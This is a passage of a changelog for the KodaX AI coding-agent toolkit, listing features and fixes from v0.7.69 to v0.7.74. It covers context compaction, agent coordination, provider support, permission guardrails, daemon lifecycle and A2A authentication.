  READMEs, and the v0.7.75 regression guide for the SDK validation candidate.
- Rescheduled FEATURE_263 from v0.7.75 to v0.7.77 and then to v0.7.78; moved
  FEATURE_274 from v0.7.76 to v0.7.77. v0.7.75 and v0.7.76 remain feature-free
  stabilization releases.

## [0.7.74] - 2026-07-23

> Git tag and GitHub Release are published by the release workflow. npm
> publication remains a separate manual operator step.

### Added

- **Absolute automatic-compaction threshold (FEATURE_272).** SDK, Runtime
  Session settings, daemon protocol, REPL, and KodaX Space now expose an
  optional token threshold. Missing/zero is inactive; otherwise the smaller of
  the absolute limit, bounded percentage policy, and physical provider capacity
  triggers compaction. Percentage defaults to 75% and clamps to 15-90%, while
  automatic large compaction remains always enabled.
- **Context-owned compaction telemetry and transcript paging.** Root and child
  turns now carry stable `contextId`/revision ownership. The canonical
  `context.compaction.finished` event reports committed before/after and
  component metrics. Runtime observations use bounded transcript slices,
  revision-bound pages, and lossless chunks for oversized entries; clients can
  require `contextCompaction:3`, `transcriptPaging:1`, and
  `transcriptSearch:1`.
- **Durable exact-history recovery.** The root host now persists and flushes
  exact pre-compaction lineage before evicting raw bodies. Island sidecars are
  committed before the slim main Session, stable entry IDs deduplicate overlap,
  and failures preserve the last exact live or persisted copy. Root Agents gain
  bounded `session_history_search` / `session_history_read`; SDK and daemon
  clients gain revision-bound `sessions.transcriptSearch()`.
- **Runtime active-run interrupt input.** Embedded Runtime and the shared daemon
  now advertise `interruptInput:1`. `runtime.runs.submitInput()` queues cloned,
  ordered input for the current active Actor Run, delivers one FIFO batch as
  separate user messages at the next safe Runner boundary, and exposes durable
  queued/delivered lifecycle facts without creating a continuation Run or
  leaking terminalized input into a later Run.

### Changed

- **Mailbox-driven Agent coordination (FEATURE_273).** Model-visible
  `wait_agent` now accepts only a bounded timeout and yields on the caller's
  mailbox, root user input, interruption, or expiry. Progress remains available
  through Actor snapshots, event replay, and SDK long-poll without waking and
  resampling the parent model. The tool returns only a wake acknowledgement;
  authenticated Agent messages and structured completion metadata enter the
  transcript once at the next safe boundary. `list_agents` owns tree-state
  inspection and `agent_output` owns targeted result reads.
- **Resident Goal lifecycle contracts.** `get_goal`, `create_goal`, and
  `update_goal` keep their complete descriptions on both SA and managed AMA
  paths. This removes an avoidable discovery round trip while preserving the
  explicit-create and three-turn blocked-state rules. The remaining deferred
  set stays at exactly 11 tools; schemas, handlers, permissions, Goal state, and
  compaction-protected receipts are unchanged.

### Fixed

- **Large compaction coverage and protected-tail basis.** Major compaction now
  protects 20% of the effective trigger rather than 20% of the model maximum,
  summarizes the complete eligible prefix in one transaction, and uses
  map-once/reduce-once only for physical overflow. Exact main-request prefix
  reuse preserves prompt/KV cache on both ordinary and managed-task paths while
  explicitly excluding the protected raw tail from the summary.
- **User intent retention across repeated and degraded compaction.** Genuine
  user queries are mechanically retained in a stable JSONL checkpoint ledger,
  including text carried beside tool results. A query is represented exactly
  once: raw while it remains in the protected tail, then in the ledger when its
  prefix is compacted. The explicit emergency-pruning fallback installs query
  recovery before removing old raw evidence.
- **SDK/UI accounting and daemon frame safety.** The legacy compact callback now
  reports post-compact tokens on both execution paths, and automatic managed
  compaction emits the same post-commit canonical event/report as the standard
  agent path. Persisted anchors include admitted post-compact attachments.
  Space ignores child context metrics for the root gauge/activity/cost display,
  displays the last root transition, labels active model input separately from
  complete visible history, and reads transcripts directly through bounded
  page/chunk calls. The legacy full-transcript daemon method rejects responses
  above 512 KiB instead of risking the 8 MiB frame.
- **Compacted-history loss and maintenance replay.** Full-lineage loads now
  merge exact sidecar entries over slim placeholders, compaction writes use a
  durable-before-evict boundary, child compaction cannot overwrite root
  lineage, and maintenance preserves its append watermark instead of archiving
  the same island entries again.
- **Agent completion delivery and resumed transcripts.** Unacknowledged root
  completions persist an explicit pending-delivery set and are republished after
  a hard restart; same-process Runtime reconstruction deduplicates the projected
  queue by child turn ID, while acknowledged and legacy historical completions
  are not replayed. Completion acknowledgement remains after authoritative
  transcript persistence. Session restore also deduplicates and canonically
  repositions tool groups by tool-use ID and binds repeated text to the latest
  persisted suffix.
- **Deterministic reads, bounded tool attention, and compaction round exits.**
  Auto Mode now handles complete risk-free static reads deterministically while
  sensitive paths, credential stores, process environments, and named secret
  variables require confirmation. Grep clips pathological lines and exposes
  bounded offset continuation; one batch-admission owner separates physical
  capacity from tool-attention spill. Current user-shaped and legacy compaction
  checkpoints no longer cause a compacted query/final pair to be appended twice.
- **Release-review boundary fixes.** Emergency compaction fallback accounts for
  system/tool overhead and response reserve before pruning and reports no
  success for unchanged or still-oversized candidates. Runtime-backed REPL paths
  use one Session writer, first-run headless compaction seeds Session metadata,
  persistence failure rolls back tentative context revision, and history search
  consistently excludes system/hidden/checkpoint/placeholder content. Auto
  permission analysis samples the middle of long operation lists, POSIX paths
  are not mistaken for Windows switches, and continuation errors identify
  `runtime.runs.submitInput` accurately.
- **Release-candidate checkpoint and PowerShell boundary closure.** Session
  lineage now consumes and re-renders the exact compaction checkpoint bytes,
  including recovery guidance, so the compaction entry, first-kept pointer, and
  post-compact attachments remain on the active path; legacy suffix-free
  checkpoints still resume. Auto Mode treats bracket wildcards on PowerShell
  path parameters as incomplete and escalates them, while exact `LiteralPath`
  filenames containing brackets remain supported.
- **Reliable continue-most-recent selection.** `kodax -c`, classic/Ink startup,
  one-shot CLI execution, and coding-runtime auto-resume now scan beyond the
  legacy ten-session window, skip zero-message ACP/bootstrap placeholders, and
  preserve an explicit session ID. Interactive resume restores the saved
  workspace runtime together with messages, UI history, lineage, artifacts,
  extensions, title, tag, and session identity before the next turn.
- **Deterministic Auto mode switching.** Entering Auto now displays the resolved
  configured engine immediately instead of a transient bare `Auto`, and Runtime
  setting writes are serialized per Session so rapid shortcut cycling is
  last-action-wins. Persisted or automatic `Auto[RULES]` fallback remains sticky
  by design and can be changed explicitly with `/auto-engine llm`.
- **Release-review debt closure.** Imperative manual compaction now reconciles
  the exact flat Session history into lineage before creating the compaction
  island. A failed durable interrupt-delivery event leaves the input queued,
  rethrows the persistence error, and emits a bounded `runtime.warning` without
  copying user input content into diagnostics.

### Documentation

- Root and generated JSONC templates, both READMEs, architecture/design docs,
  the SDK embedder guide, feature/issue trackers, release verification guide,
  package READMEs, and `kodax_manual` now describe the complete v0.7.74
  compaction, mailbox-wait, active-run input, Goal-tool, resume, Auto-switch,
  and recovery contracts.

## [0.7.73] - 2026-07-20

### Added

- **Qwen Token Plan provider.** The new `qwen-token-plan` alias uses the
  Anthropic-compatible Alibaba Cloud Token Plan endpoint and
  `QWEN_TOKEN_API_KEY`. It defaults to `qwen3.8-max-preview`, exposes the
  supported Qwen 3.7/3.6, GLM-5.2, and DeepSeek V4 Pro routes with one-million-
  token context metadata, and declares verified reasoning, image-input, and
  nominal subscription-cost capabilities without changing the existing `qwen`
  provider.
- **First-run provider setup (FEATURE_271).** A bare interactive `kodax`
  launch with no selected provider and no supported local credential now opens
  a focused provider/model setup flow before Runtime, daemon, session, or REPL
  startup. `kodax setup` reruns the same flow explicitly. It stores only
  non-secret metadata, preserves unrelated config through a revision-checked
  atomic write, refuses malformed existing custom providers and credential-
  bearing endpoint URLs, and then names the required environment variable and
  terminal restart steps.
- **Typed Auto Mode SDK contract (FEATURE_271).** The root and REPL SDK
  entries now export one pure `resolveAutoModeSettings()` plus the authoritative
  loader and related types; `loadConfig().autoMode` is declared, Runtime Session
  settings persist `autoModeSpeculativeWindowMs` (including `0`), and side
  queries return prompt-free provider/model/timing/retry/phase diagnostics.
- **Runtime-owned concrete permission grants.** Embedded and daemon SDK clients
  can submit concrete `toolInput` and `executionCwd`, receive only opaque
  Runtime-issued Session/persistent grant suggestions, and select a suggestion
  without constructing or widening its hidden matcher. Exact command, known
  file-tool path, and generic exact-call matchers remain revisioned and audited;
  dynamic or dangerous shell calls never receive a persistent suggestion.

### Fixed

- **Reasoning, Auto Mode, and confirmation regressions.** Native
  disabled-thinking requests now send the provider's explicit disabled form
  only for models that declare support (including verified Qwen Token Plan 3.7
  routes); always-thinking variants retain their declared behavior. Sidecar
  queries preserve a supported `none` effort, persisted Runtime Auto engines
  are not overwritten by a fresh REPL, `/mode` synchronizes before reporting
  success, and concurrent confirmation prompts are serialized instead of
  replacing one another.
- **Legacy permission-grant upgrade safety.** Matcherless grants persisted by
  older releases remain visible and revocable but can no longer authorize a
  concrete tool call. The next invocation requires a fresh Runtime-issued
  matcher, so old coarse Bash grants cannot bypass exact-command, dynamic-shell,
  or absolute-deny protections.
- **Classifier credential boundary.** Auto[LLM] now redacts explicitly named
  credential values inside shell-escaped JSON before sending an action to its
  side provider, while retaining adjacent operational fields. Redaction is
  documented as defense in depth; arbitrary Base64/hex values are not treated
  as secrets without a credential signal.
- **Todo/Actor semantic progress checkpoint (FEATURE_270 follow-up).** Worker
  guidance now treats Todo rows as user-visible milestones rather than Actor
  instances and requires timely updates at milestone boundaries. Structured
  terminal child results arm one deduplicated, warn-only reconciliation
  reminder; transcript scans are append-incremental with safe compaction
  fallback, and Sidecar accept-time residual reconciliation emits a diagnostic
  without changing its existing bridge contract.
- **Auto LLM classifier timeout and missing-model escalation.** Runtime now
  treats omitted Auto engine as the documented LLM default and still owns the
  guardrail, while a missing/blank/malformed effective classifier model fails
  as a typed recoverable Runtime error or a local block in the shared
  `createAutoModeToolGuardrail` boundary. The final guardrail check runs before
  provider lookup and cannot invoke `askUser`, record a circuit-breaker error,
  or downgrade to rules. Classifier requests strip assistant prose/thinking,
  cap normalized transcript/tool-result/action/prompt bytes, remove image
  paths, and cap the structured response at 256 tokens. The 20-second deadline remains bounded:
  a four-call `zai-coding/glm-5.2` probe completed representative Windows
  permission verdicts in 1.9–2.8 seconds, while the matching production session
  revealed a 1.625 MB tool result that had bypassed the existing sanitizer.
- **Auto guardrail daemon and tracing semantics.** Auto-started Runtime clients
  now require `runtimeAutoModeGuardrail:3`. It retains v2's effective
  timeout/window defaults, bounded classifier input, and diagnostics metadata,
  and adds opaque concrete-grant semantics. Capability negotiation is monotonic
  (v3 satisfies v2/v1); idle older daemons use the existing fenced upgrade path,
  while busy daemons are left untouched with a recoverable error. Guardrail
  spans now cover the awaited callback instead of timing only final verdict
  emission.
- **Concurrent daemon startup publication race.** A cleanly exiting loser now
  gives the elected owner a bounded publication grace period, preventing an
  SDK starter from reporting failure during the short lock/state handoff gap.
- **Guardrail/permission execution parity.** Both Runner paths now commit each
  guardrail rewrite before permission policy and execution, reject correlation-
  id rewrites, propagate blocks as visible audited tool results, and preserve
  embedded host policy hooks while rejecting non-transportable daemon hooks.
  Calls rewritten into Bash retain serialized shell ordering.
- **Managed-run capacity and tool-dispatch accounting.** A complete system
  prompt override no longer double-counts Skills, missing provider usage rebases
  from the final request envelope, and authoritative provider usage remains
  intact. Non-Bash tool calls keep parallel dispatch, Bash remains sequential,
  and aggregate tool-result spill decisions use the complete batch budget.

## [0.7.72] - 2026-07-19

### Added

- **Learning Center and learned-capability Runtime control plane
  (FEATURE_266).** KodaX now owns learned capability lifecycle, notification
  cursors, lower-precedence learned Skill discovery, F224 proposal projection,
  promotion/rollback actions, and inline/Worker/daemon SDK parity through one
  agent-layer service. `/learn`, status summaries, and the Ink learning segment
  expose the same durable state without creating a second runtime engine.
- **Unified adaptive Actor/Turn control plane (FEATURE_270).** AMA collaboration
  now uses one Runtime-owned actor tree and scheduler across native, recursive,
  Workflow-owned, constructed, and external Agent work. The canonical
  `spawn_agent`, `send_message`, `followup_task`, `wait_agent`,
  `interrupt_agent`, `list_agents`, and `agent_output` surface supports reusable
  Actor identities, durable Turn history, direct-parent completion, recursive
  delegation, shared capacity, and SDK/daemon recovery. A manifest-first,
  fail-closed behavioral eval driver freezes the released/current production
  prompt and tool bytes, call graphs, budgets, raw evidence, and blind review
  mapping before any separately authorized provider call.

### Changed

- **Current coding-eval aliases and MiniMax default model.** Newly authored or
  revised evals now route Zhipu through `zhipu/glm52` (`glm-5.2`) and MiniMax
  through `mmx/m3` (`MiniMax-M3`). `minimax-coding` now defaults to M3 while
  the old `zhipu/glm51` and `mmx/m27` aliases remain explicitly selectable for
  historical replay; existing raw evidence and reports keep their original
  route labels.
- **AMA and Workflow orchestration cutover.** AMAW and the old model-visible
  child-task vocabulary are retired. Persisted `amaw`/`ama-workflow` settings
  migrate once to AMA, while new inputs fail with a migration hint. Workflow
  remains available for explicit natural-language, command, named-pattern, and
  SDK requests, but its child Agents now use the unified Actor scheduler and
  task complexity alone no longer activates Workflow.

### Fixed

- **Remote Runtime subscription readiness.** Daemon event/workflow
  subscriptions now expose an awaitable `RuntimeSubscription.ready` handshake,
  so hosts can establish cross-client ordering before starting work whose first
  event must not be missed. Handshake failures remain observable to new callers
  without creating unhandled rejections in legacy callers that ignore `ready`.

- **Detached daemon lifecycle cleanup.** CLI and SDK startup now retain the
  exact candidate process until its PID is healthy and reclaim only that process
  tree on early exit, timeout, identity mismatch, owner-race loss, or startup
  cancellation. Vitest-owned daemons also shut down when a forcibly terminated
  worker cannot run normal teardown; production daemons remain persistent after
  ordinary client detach and have no idle reaper. A source daemon child now
  carries only KodaX's production preload, explicit `tsx` support, and safe
  Node engine flags instead of inheriting arbitrary parent loaders, preventing
  test-runner hooks from parsing daemon CLI arguments.

- **Windows memory lifecycle lock contention.** Concurrent forget/archive
  operations now retry short-lived Windows sharing denials within the existing
  bounded lock deadline instead of failing immediately with `EPERM`; unrelated
  filesystem errors remain fail-fast.

- **MiniMax M3 default media regression.** The media capability suite now
  expects the current `minimax-coding` default, MiniMax M3, to support image
  input while retaining fail-closed checks for unverified nearby routes.

- **Bare resume cancellation terminal release.** Pressing Esc in `kodax -r`
  now pauses and unreferences the picker-owned stdin path before the bootstrap
  exits, so Windows PowerShell regains its prompt immediately without requiring
  an extra keypress. The full CLI remains unloaded while listing sessions,
  successful selection hands input to the REPL, and replay retains each
  persisted event timestamp.
- **Auto[LLM] approval reliability.** The default classifier budget is now 20
  seconds, pure readonly invocations bypass classification by invariant, and
  SDK/daemon session settings can select the classifier model and timeout without
  stale guardrail-cache reuse. Runtime advertises and requires
  `runtimeAutoModeGuardrail:1` for auto-started daemon clients, owns the Session
  guardrail ahead of the generic permission hook, persists LLM-to-rules
  fallback, and creates a shared pending request only for an explicit
  escalation. An older daemon is replaced only after a revision/owner-policy
  fenced preflight proves that active/queued work and pending interactions are
  absent; busy or unfenceable daemons return a typed recoverable error. The one
  conditional readonly exception, `semantic_lookup(refresh:true)`, remains
  classified because it rebuilds the on-disk derived index.
- **Runtime permission boundary correctness.** Relative operands resolve from
  the validated execution directory while `gitRoot` remains a safety boundary;
  Windows containment is case-insensitive, deterministic direct/nested-shell
  writes to the user `.kodax` credential zone are Tier-0 denied, and quoted
  Python/regexp source is not treated as a path. Permission previews use a
  scan-bounded field whitelist, omit write/edit bodies, redact JSON/YAML/PEM
  and command-line credentials, and remain valid size-limited JSON with that
  directory. `exit_plan_mode` is absent without a real host approval bridge.
- **0.7.x SDK source compatibility.** Deprecated `amaw` input is accepted and
  normalized to AMA without restoring retired behavior; formal `SkillSource`
  remains exhaustive while `ResolvedSkillSource` adds `learned`; daemon
  preflight normalizes canonical `activeAgentTurns` and deprecated
  `activeAgentTasks` to the same required array across old and current wire
  shapes.
- **Queued follow-up responsiveness.** REPL, AMA, and SA now share the same
  Actor queue routing contract while SA retains its legacy unscoped queue. User
  input wakes `wait_agent` and idle-yield through lossless subscriptions and
  resumes at a safe turn boundary without canceling unrelated parallel tools.
  SDK media follow-ups accept an explicit `sessionId`, preserve old single-Actor
  calls through lifecycle-bound auto-routing, and reject ambiguous concurrent
  calls instead of crossing sessions.

## [0.7.72-hotfix.0] - 2026-07-17

### Fixed

- **Ark Coding image input routing.** The SDK now recognizes the five verified
  Ark Coding routes (`doubao-seed-2.0-code`, `doubao-seed-2.0-pro`,
  `kimi-k2.7-code`, `kimi-k2.6`, and `MiniMax-M3`) as image-capable instead of
  raising `MODEL_INPUT_UNSUPPORTED` before provider dispatch. The change is
  scoped to those exact provider/model pairs; other Ark models and all Ark
  video input remain fail-closed. Capability, validation, final Anthropic
  base64 serialization, and opt-in real-gateway regressions cover all five.

## [0.7.71] - 2026-07-17

### Added

- **Kimi Code K3 support.** The `kimi-code` subscription provider now exposes
  `k3-256k` (Moderato) and `k3` (1,048,576 context tokens, Allegretto+) as
  explicit catalog choices, alongside `kimi-for-coding-highspeed` and the
  stable `kimi-for-coding` default. Both K3 choices send the upstream model id
  `k3`, so users do not need to override compaction settings for their plan.
  K3 sends its effort inside `thinking.effort` on both Anthropic- and
  OpenAI-compatible transports, defaults omitted reasoning to `max`, and
  preserves both legacy `reasoning=false` and explicit `effort=none` as disabled
  thinking. Static capability, reasoning, media, cost-tracking, and opt-in
  real-wire regressions cover the subscription routes and local context-tier
  mapping.
- **Standards-based A2A authentication and Agent activation (FEATURE_267/268
  closure).** Outbound A2A entries can use OAuth 2.0 Client Credentials with an
  external Authorization Server, while inbound KodaX Agents can validate RFC
  9068 JWT access tokens against an external issuer/JWKS as an OAuth Resource
  Server. The fixed environment Bearer profile remains available for
  compatibility. A hot `agents.<name>.enabled` switch plus `kodax a2a
  enable|disable` lets operators keep many configured third-party Agents while
  controlling which ones admit new orchestration; in-flight tasks are not
  cancelled.

### Changed

- **External Agent SDK migration notes.** `AgentRegistrationService` now
  requires `setEnabled`; custom implementations must add the same
  revision/owner-conditional enablement operation. `executorConfig` and
  executor-reference `metadata` are `AgentJsonObject` values and reject class
  instances, accessors, circular references, and other non-JSON-safe data at
  runtime. SDK daemon auto-start without an explicit `homeDir` now follows the
  resolved `KODAX_HOME`; embedders that intentionally need the OS-home endpoint
  must pass `homeDir`, while custom endpoints remain attach-only.

### Fixed

- **A2A durable-owner upgrade and admission concurrency.** New inbound tasks
  persist a non-secret principal-key scheme marker. Pre-realm tasks remain
  inaccessible during normal serving, but stopped operators can use
  `kodax a2a migrate-tasks` to dry-run and explicitly apply the configured
  owner mapping; custom hosts can use the public
  `migrateA2ALegacyTaskOwners()` SDK with exact mappings. Ambiguous or live-
  store migration fails closed. Global task capacity now uses a synchronous
  pending reservation, keeping slow workspace/session/run preparation outside
  any global lock while preserving exact limits and per-principal ordering.
- **Bounded External Agent and daemon shutdown/startup.** Executor-plane close
  now has a 30-second default upper bound (overrideable with `closeTimeoutMs`),
  obsolete-executor cleanup runs outside the serialized registration mutation
  lane, and revision tombstones are SHA-256 fingerprints capped at 4,096
  entries. Current registrations and task snapshots continue to enforce exact
  revision immutability after older, unreferenced tombstones age out. Daemon
  auto-start now races health checks against the spawned child's exit, keeps
  the child referenced until readiness, and terminates it on early exit,
  timeout, identity mismatch, or when another daemon wins ownership. A startup
  candidate that exits after losing the owner race now lets its SDK caller wait
  for and attach to the competing owner instead of failing that caller.
- **Faster packaged-Electron gates.** Release jobs build once and reuse that
  output for both the Windows Electron smoke and binary packaging. CI and
  release jobs cache the version-pinned Electron smoke toolchain, whose local
  directory is now explicitly ignored. Both paths explicitly materialize the
  Electron binary after cache restore or dependency installation, preventing a
  successful npm package install with a missing `electron/dist` from bypassing
  the real packaged-daemon gate.
- **A2A authentication and reconciliation hardening.** Card-level and
  Skill-level security requirements now fail closed unless one complete
  alternative is satisfiable. Card, RPC, and token origins remain separate;
  exact credentials used by active RPC/SSE requests remain retained through
  response parsing and are redacted from errors and successful results;
  concurrent rejected-token invalidation cannot discard a newer token and each
  RPC retries at most once. Direct SDK and file configuration now share strict
  issuer, endpoint, resource, and RFC 6749 scope validation. Task ownership
  also requires a stable `securityRealm` and hashes the
  `(realm, subject, tenant)` tuple: built-in Bearer/OAuth derive realms from the
  token-env name/exact issuer, custom authentication must provide one, authority
  switches and legacy pre-realm tasks fail closed, and same-realm restart
  preserves new-format tasks. Authentication/effect changes participate in
  executor revisions; registration persistence
  precedes catalog mutation; first-class management ownership plus revision-
  conditional mutations protects unrelated or concurrently replaced SDK
  registrations, including same-revision owner takeovers; changed authority is
  fenced before parallel discovery; live drift is repaired; and a final
  post-preflight admission check closes disable/removal races without
  rediscovering unchanged peers. Internal immutable route snapshots preserve
  admitted task input/cancel/reconcile routing across registration update or
  removal and Runtime restart without exposing secret material or expanding the
  public task DTO. Admission now rechecks globally unique task IDs, task writes
  publish to memory only after durable persistence, and terminal event-write
  failures cannot strand waiters or route snapshots. Returned registration
  summaries are detached, executor cache keys are unambiguous tuples, and one
  ownership conflict or observer failure cannot abort unrelated Agent
  reconciliation or leave unawaited activation work. Daemon A2A ownership is
  now bound to the exact resolved config home—`<homeDir>/.kodax` when explicitly
  selected, otherwise the possibly arbitrary `KODAX_HOME`—recorded in daemon
  state, and checked across every local profile before mutation. Legacy
  non-empty version-1 A2A files require an explicit stopped-owner migration,
  while version-2 migration is a read-only idempotent no-op. Failed initial A2A
  reconciliation also closes the newly created Runtime before releasing daemon
  ownership.
- **A2A post-closure lifecycle and resource correctness.** Executor operations
  and close now drain without disposal races; configured artifact references
  and direct `a2a call` use a bounded reference-only/no-fetch policy. CLI task
  RPC/SSE permits 32 MiB while Card/interface/OAuth/security metadata remains
  capped at 2 MiB, and unsupported required Card extensions fail discovery.
  Daemon mutation now requires independently owner-derived
  `externalAgentAdmin: 1` and `a2aConfigReconciler: 1`; capability overrides
  cannot forge them. Public `/a2a` config exports are read-only, with raw writers
  retained inside the fenced CLI owner. Inbound serving now has a global
  admission reservation, subscribe-first replay, authentication-before-body,
  exact JSON/SSE media matching, an admitted-handler close barrier, and fixed
  four-per-task/eight-per-server/24 MiB-per-stream SSE ceilings without
  terminating the underlying task for one slow subscriber.
- **Public Kimi Open Platform parity and live coverage.** `kimi` now defaults to
  `kimi-k2.7-code`, exposes the HighSpeed route and wire-legal K2.5 id, uses the
  exact 262,144-token limits and current prices, and has gated real-key coverage
  for credential verification, K2.7 thinking, forced-tool fallback, and K2.6
  thinking disablement. K2.7 disable requests now fail locally instead of being
  silently ignored, while K2.6 disable requests emit the required wire toggle.

- **Packaged Electron shared-daemon auto-start.** Runtime SDK embedders running
  from packaged/asar Electron applications now launch the detached daemon child
  through a bootstrap-only Node execution boundary without changing the host or
  long-lived daemon environment, leaking `ELECTRON_RUN_AS_NODE` to user child
  processes, or opening a second GUI instance. Trusted internal JavaScript
  children retain a bounded Electron-to-Node launch path. Missing packaged CLI
  sidecars fail immediately, disabled `RunAsNode` fuses receive an actionable
  timeout diagnostic, and a real Windows Electron 42.5.0 + asar smoke now gates
  CI and releases. Public docs also distinguish CLI-style `homeDir` from the
  lower-level `.kodax` path used by `KODAX_HOME`.
- **Cross-platform release template checks.** Generated configuration templates
  now compare normalized line endings, so Windows CRLF checkouts no longer report
  false drift during binary builds.

## [0.7.70] - 2026-07-15

### Added

- **Typed shared-daemon rollback management (FEATURE_269 patch).** Daemon
  facades now expose revisioned management inspection and atomic
  `stopForInline()`, plus public owner-fence queries and revision-free daemon
  re-enable helpers for safe embedder rollback workflows.

### Changed

- **KAI-FCL licensing from v0.7.70.** Official KodaX source, binaries, and npm
  packages now use the KodaX-AI Fair Core License 1.0: community use remains
  available, while commercial or managed use requires KodaX-AI authorization.
  Previously released Apache-2.0 copies retain their original grants.

### Fixed

- **A2A interoperability and execution boundaries.** Selected Card interfaces
  remain bound to their trusted discovery origin and advertised Bearer scheme;
  concrete recursive reads and child runs retain the parent policy ceiling;
  pending input resumes the original Runtime run; task retention, history,
  cleanup, stable cursor pagination, protocol correlation/version, authenticated
  SSE, appended artifact chunks, and early-stream-EOF semantics are bounded;
  and direct, staged, or successfully promoted admitted Skill outputs are
  returned as negotiated artifacts without exposing ordinary workspace writes.
- **MCP multilingual zero-match efficiency.** Compact CJK queries now segment
  into words, while cross-language lexical zero matches can return a lossless
  shared-prefix exact-id inventory only when it is no more expensive than a
  normal default search page and fits the real result capacity. Oversized
  recovery emits one concise catalog-language retry with no biased partial list.
  Fully unavailable catalogs no longer trigger a duplicate inventory attempt;
  concurrent discovery is coalesced, in-flight invalidation cannot be overwritten,
  and filtered cursor revisions ignore unrelated capability families.
- **Logical daemon client accounting.** Stop preflight now counts only live,
  initialized SDK clients. Daemon self-connections and read-only health probes
  are excluded, and awaited client close converges the count across processes.
  Health probes also tolerate the daemon token disappearing during a concurrent
  shutdown or owner transition instead of leaking an `ENOENT` race to clients.
- **Preflight/stop race.** Rollback commit gates new clients and mutations,
  validates the same Runtime, management revision, owner-policy revision, and
  blockers, and changes sticky inline policy while the verified daemon still
  owns the profile fence. Stale commits fail with structured `conflict` and do
  not stop or change policy.
- **Complete rollback draining and background-work blockers.** Credential and
  Host Tool bridge state can no longer change after draining starts, while
  running/paused Workflows and non-terminal or unknown External Agent tasks now
  block stop and participate in the management revision. Reverse-result frames
  remain outside the durable journal so credentials and Host Tool results are
  not persisted. In-flight stop conflicts identify the active mutation methods
  and counts so lifecycle stalls can be diagnosed without reproducing them.

## [0.7.69] - 2026-07-15

> Scope note: this release delivers **FEATURE_267**, **FEATURE_268**, and
> **FEATURE_269** as one bounded interoperability/runtime release: bidirectional
> A2A 1.0, split hot-reloadable integration configuration, and one authoritative
> shared Coder daemon with secure host bridges. It does not expose the daemon
> remotely, migrate Partner from its private embedded Runtime, or publish
> credentials/Host Tools outside their bound run.

### Added

- **Bidirectional A2A 1.0 interoperability (FEATURE_267).** Added the
  `@kodax-ai/kodax/a2a` integration edge: allowlisted Agent Card discovery and
  a JSON-RPC/SSE executor over the existing F258 plane, plus an authenticated,
  caller-scoped, durable Runtime-backed KodaX Agent server with continuation,
  cancellation, ordered replay/subscription, and restart reattachment.
- **No-code A2A product path and Runtime binding.** Added declarative
  `a2a add/list/test/call/remove`, automatic `external:<name>` registration for
  built-in Runtime owners, and explicit `a2a expose` / loopback-only `a2a
  serve`. The inbound server can publish the Runtime default or one validated
  user Markdown Agent with pinned Agent/Skill/tool/workspace revisions,
  structured `toolPolicy`, `~/.agents/skills` discovery, and exact Skill-script
  execution through the fail-closed ASRT adapter.
- **Split integration configuration and hot reload (FEATURE_268).** MCP, A2A,
  and Extensions now use one user-level versioned file per domain, backed by
  four canonical templates, explicit lossless migration, locked atomic writes,
  last-known-good watchers with metadata fallback, whole-provider MCP draining,
  entry-transactional Extension/outbound-A2A reconciliation, and explicit
  restart-required handling for inbound execution/store authority changes.
- **A2A network and publication boundaries.** Outbound fetches enforce origin,
  DNS/private-address, TLS, redirect, credential, timeout, content-type, and
  size policy. The built-in server listener is loopback-only; public hosts use
  `handle()` behind TLS. A2A 0.3, gRPC, HTTP+JSON, push notifications, automatic
  public Agent exposure, and remote Runtime configuration are not advertised.
- **Authoritative shared Coder daemon (FEATURE_269).** Added atomic
  `sessions.observe()` join/resync, durable operation identities and receipts,
  stable same-session ordering, settings/grant CAS, transport-safe AskUser and
  permission resolution, live run projection, structured restart outcomes, and
  a truthful per-capability Coder compatibility matrix for CLI, Space, IDE, and
  SDK clients.
- **Shared-daemon SDK completion.** Server-side Coder/Partner admission now
  covers every session and run path; late-join snapshots include transcript
  revision, managed tasks, queued continuation metadata, and reverse
  requirements. The SDK adds prompt connection lifecycle signals, typed event
  parsing with per-event degradation, daemon-safe run DTOs,
  `agentMode`/`autoModeEngine` settings CAS, durable operation/Host Tool outcome
  queries, and daemon stop/rollback preflight.
- **Secure host bridges and owner fencing.** Provider credentials are supplied
  just in time through stable-client/run/provider-bound leases and never
  persisted. A keychain-held stable client secret can reattach credential and
  Host Tool handlers after Space reconnects; Host Tools remain immutable and
  run-bound, with fsynced dispatch truth and explicit unknown outcomes rather
  than blind replay. Daemon and inline Coder ownership share one revisioned
  fence with sticky rollback, while Partner remains isolated.

### Changed

- **Tool-result delivery now optimizes end-to-end context use.** Tool handlers
  collect complete results and one aggregate next-request capacity owner keeps
  every result inline when the batch fits. Default Bash processing no longer
  applies command-specific lossy filters; its former 512 KiB capture limit is
  now only a memory-to-disk spool threshold. Capacity is solved against the
  final input (`Pmax`), so the 3% uncertainty margin grows with the admitted
  batch instead of being frozen at the smaller pre-batch request.
- **History compaction is physical-capacity driven.** Default automatic
  compaction waits until the final provider envelope (system prompt, actual
  tools, messages/framing, output reserve, and safety margin) cannot fit.
  Default microcompaction and destructive pre-summary/fallback pruning are off;
  pressure uses semantic summary first and stops as soon as the next request
  fits. Static early percentages remain explicit opt-ins, and manual
  `/compact` remains an explicit force operation.
- **Self-knowledge follows the v0.7.69 capability surface.** `kodax_manual`
  now documents the three split integration files and migration/hot-reload
  behavior, the `/a2a` SDK subpath, atomic shared-daemon observation, durable
  controls, run-scoped credentials/Host Tools, and daemon/inline ownership.

### Fixed

- **Recoverable overflow and hidden output caps.** Overflow of the final
  operational request budget saves the complete result and emits one explicit
  incomplete marker. Long lines have exact continuation offsets, completed task
  output is complete, and hidden caps were removed from grep, glob, code search,
  and retrieval rendering.
- **Cache token accounting and history preservation.** Cache tokens are charged
  once. Empty, failed, or insufficient summaries now surface a typed capacity
  error while retaining the canonical transcript and immutable Worker prompt.
- **Tool-result completeness and retention edge cases.** No-usage accounting
  includes the final system prompt, active schemas, and same-request recovery;
  explicit limits use one-extra-item probes; delayed Bash drain remains
  recoverable. Referenced result/image artifacts and fresh checkpoints are no
  longer removed by age-only cleanup.
- **Post-review capacity correctness.** Trusted artifact metadata cannot be
  forged by raw tool text; failures carry the last legal transcript; observers
  see admitted content; child evidence uses the routed model's physical budget;
  bounded acquisition exposes continuation instead of silent loss; direct Bash
  artifacts remain canonical without nested spill markers.
- **Windows process-tree fallback.** A failed or timed-out `taskkill /t` now
  triggers a native Toolhelp parent snapshot before direct escalation, with
  CIM/WMIC retained only as fallback. Agent and LLM cleanup stay aligned and a
  real nested-process regression proves descendants exit.
- **Windows lock deletion races.** Proposal and lifecycle lock probes treat
  transient `EPERM`/`EACCES`/`EBUSY` as non-stale and retry, preserving the
  fail-closed owner-token contract during concurrent removal.
